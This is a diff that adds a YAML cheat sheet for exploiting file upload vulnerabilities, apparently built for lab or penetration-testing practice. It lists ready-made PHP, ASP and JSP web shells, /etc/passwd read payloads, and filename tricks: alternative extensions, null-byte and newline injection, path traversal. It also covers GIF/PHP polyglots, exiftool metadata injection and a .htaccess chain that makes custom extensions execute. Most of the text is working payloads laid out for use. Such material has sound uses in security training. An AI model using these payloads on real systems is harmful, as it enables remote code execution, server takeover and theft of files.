@@ -1,0 +1,388 @@
+name: File Upload Vulnerabilities
+
+steps:
+
+# =========================================================
+# [1] UPLOAD ENUMERATION
+# =========================================================
+- title: Upload Enumeration
+  mode: enum
+  info: |
+    Identify upload restrictions, execution behavior,
+    backend language, and upload paths.
+
+  entries:
+
+    - cmd: "upload test.jpg"
+      info: baseline upload test
+
+    - cmd: "upload shell.php"
+      info: direct php upload test
+
+    - cmd: "upload shell.phtml"
+      info: alternative php extension
+
+    - cmd: "upload shell.php5"
+      info: legacy php extension
+
+    - cmd: "upload shell.phar"
+      info: phar execution test
+
+    - cmd: "GET /uploads/shell.php"
+      info: test execution
+
+    - cmd: "GET /files/avatars/shell.php"
+      info: common upload path
+
+    - cmd: "GET /index.php"
+      info: identify php backend
+
+    - cmd: "GET /index.aspx"
+      info: identify asp.net backend
+
+    - cmd: "GET /index.jsp"
+      info: identify java backend
+
+  look_for:
+    - successful upload
+    - file execution
+    - source code disclosure
+    - upload path
+    - php errors
+    - apache headers
+    - nginx headers
+
+  notes:
+    - source code displayed != execution
+    - executed php confirms RCE
+    - upload path often visible in responses
+    - try alternative extensions early
+
+
+# =========================================================
+# [2] BASIC WEB SHELLS
+# =========================================================
+- title: Basic Web Shells
+  mode: enum
+  info: |
+    Minimal payloads for confirming code execution.
+
+  entries:
+
+    - cmd: |
+        <?php system($_GET['cmd']); ?>
+      info: php command execution shell
+
+    - cmd: |
+        <?php echo file_get_contents('/etc/passwd'); ?>
+      info: file read payload
+
+    - cmd: |
+        <?php echo "test"; ?>
+      info: execution verification
+
+    - cmd: |
+        <% eval request("cmd") %>
+      info: asp/aspx shell
+
+    - cmd: |
+        <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+      info: jsp shell
+
+  look_for:
+    - command execution
+    - uid output
+    - www-data
+    - file contents
+    - execution errors
+
+  notes:
+    - use smallest payload possible first
+    - confirm execution before reverse shells
+    - web shells work even without outbound access
+
+
+# =========================================================
+# [3] MIME TYPE BYPASS
+# =========================================================
+- title: MIME-Type Bypass
+  mode: enum
+  info: |
+    Bypass upload filters that trust Content-Type headers.
+
+  entries:
+
+    - cmd: |
+        Content-Type: image/jpeg
+      info: spoof jpeg mime type
+
+    - cmd: |
+        Content-Type: image/png
+      info: spoof png mime type
+
+    - cmd: |
+        filename="shell.php"
+        Content-Type: image/jpeg
+      info: php upload with fake mime
+
+    - cmd: |
+        filename="shell.phtml"
+        Content-Type: image/png
+      info: alternative extension + mime bypass
+
+  look_for:
+    - upload success
+    - changed response length
+    - bypassed upload restrictions
+
+  notes:
+    - multipart uploads contain multiple content-type headers
+    - usually only the file-part header matters
+    - burp repeater is ideal here
+
+
+# =========================================================
+# [4] EXTENSION BLACKLIST BYPASS
+# =========================================================
+- title: Extension Blacklist Bypass
+  mode: enum
+  info: |
+    Bypass weak extension blacklists.
+
+  entries:
+
+    - cmd: "shell.phtml"
+      info: alternative php extension
+
+    - cmd: "shell.php5"
+      info: php5 extension
+
+    - cmd: "shell.phar"
+      info: phar extension
+
+    - cmd: "shell.inc"
+      info: inc extension
+
+    - cmd: "shell.PHP"
+      info: case bypass
+
+    - cmd: "shell.pHp"
+      info: mixed case bypass
+
+    - cmd: "shell.php.jpg"
+      info: reverse double extension
+
+    - cmd: "shell.jpg.php"
+      info: classic double extension
+
+  look_for:
+    - upload success
+    - blacklist bypass
+    - executable uploads
+
+  notes:
+    - blacklist filtering is usually weak
+    - apache/php configs often execute alternative extensions
+    - test case sensitivity on windows targets
+
+
+# =========================================================
+# [5] OBFUSCATED EXTENSIONS
+# =========================================================
+- title: Obfuscated Extension Bypass
+  mode: enum
+  info: |
+    Exploit parser confusion and filename truncation.
+
+  entries:
+
+    - cmd: "shell.php%00.jpg"
+      info: null byte injection
+
+    - cmd: "shell.php%20.jpg"
+      info: space injection
+
+    - cmd: "shell.php%0a.jpg"
+      info: newline injection
+
+    - cmd: "shell.php/.jpg"
+      info: slash confusion
+
+    - cmd: "shell.asp;.jpg"
+      info: iis semicolon trick
+
+    - cmd: "shell.aspx:.jpg"
+      info: windows ads trick
+
+  look_for:
+    - filename truncation
+    - upload success
+    - extension stripping
+    - parser confusion
+
+  notes:
+    - old php versions vulnerable to null byte injection
+    - windows and iis behave differently
+    - encoding tricks often bypass weak regex
+
+
+# =========================================================
+# [6] PATH TRAVERSAL UPLOAD
+# =========================================================
+- title: Path Traversal Upload
+  mode: enum
+  info: |
+    Escape upload directories using traversal sequences.
+
+  entries:
+
+    - cmd: |
+        filename="../shell.php"
+      info: direct traversal
+
+    - cmd: |
+        filename="..%2fshell.php"
+      info: encoded traversal
+
+    - cmd: |
+        filename="..%252fshell.php"
+      info: double encoded traversal
+
+    - cmd: |
+        GET /files/../shell.php
+      info: execute uploaded shell
+
+  look_for:
+    - reflected traversal
+    - changed upload path
+    - execution outside upload dir
+
+  notes:
+    - upload directories may block execution
+    - traversal can move file into executable path
+    - url encoding often bypasses sanitization
+
+
+# =========================================================
+# [7] POLYGLOT / MAGIC BYTE BYPASS
+# =========================================================
+- title: Polyglot & Magic Byte Bypass
+  mode: enum
+  info: |
+    Bypass content validation using valid image headers.
+
+  entries:
+
+    - cmd: |
+        GIF89a;
+        <?php system($_GET['cmd']); ?>
+      info: gif/php polyglot
+
+    - cmd: |
+        exiftool -Comment="<?php system($_GET['cmd']); ?>" image.jpg -o shell.php
+      info: php payload in metadata
+
+    - cmd: |
+        exiftool -Comment="<?php echo file_get_contents('/etc/passwd'); ?>" image.jpg -o shell.php
+      info: metadata file-read payload
+
+  look_for:
+    - upload success
+    - mime bypass
+    - execution inside image file
+    - reflected payload output
+
+  notes:
+    - gif magic bytes are easy to spoof
+    - many apps trust mime_content_type()
+    - exif metadata injection is extremely common in labs
+
+
+# =========================================================
+# [8] .HTACCESS ABUSE
+# =========================================================
+- title: .htaccess Abuse
+  mode: chain
+  info: |
+    Abuse Apache configuration uploads to execute arbitrary extensions.
+
+  entries:
+
+    - cmd: |
+        AddType application/x-httpd-php .l33t
+      info: map l33t extension to php
+
+    - cmd: |
+        filename=".htaccess"
+      info: upload apache config
+
+    - cmd: |
+        filename="shell.l33t"
+      info: disguised php shell
+
+    - cmd: |
+        GET /uploads/shell.l33t?cmd=id
+      info: execute uploaded shell
+
+  look_for:
+    - successful .htaccess upload
+    - php execution on custom extension
+    - apache backend
+
+  notes:
+    - only works on apache
+    - requires AllowOverride enabled
+    - extremely common portswigger technique
+
+
+# =========================================================
+# [9] FULL FILE UPLOAD WORKFLOW
+# =========================================================
+- title: Full Upload Workflow
+  mode: chain
+  info: |
+    Generic methodology for exploiting file upload vulnerabilities.
+
+  entries:
+
+    - cmd: "upload test.jpg"
+      info: baseline upload test
+
+    - cmd: "upload shell.php"
+      info: direct shell upload
+
+    - cmd: "modify Content-Type: image/jpeg"
+      info: mime bypass attempt
+
+    - cmd: "try alternative extensions"
+      info: blacklist bypass
+
+    - cmd: "try shell.php.jpg"
+      info: double extension test
+
+    - cmd: "try shell.php%00.jpg"
+      info: obfuscation test
+
+    - cmd: "try traversal filename"
+      info: escape upload dir
+
+    - cmd: "try gif/php polyglot"
+      info: mime signature bypass
+
+    - cmd: "upload .htaccess"
+      info: apache extension mapping
+
+    - cmd: "GET /uploads/shell.php?cmd=id"
+      info: confirm RCE
+
+  look_for:
+    - upload success
+    - execution
+    - reflected command output
+    - file path disclosure
+    - server errors
+
+  notes:
+    - always confirm execution first
+    - upload filtering and execution rules are separate attack surfaces
+    - combine bypass techniques progressively
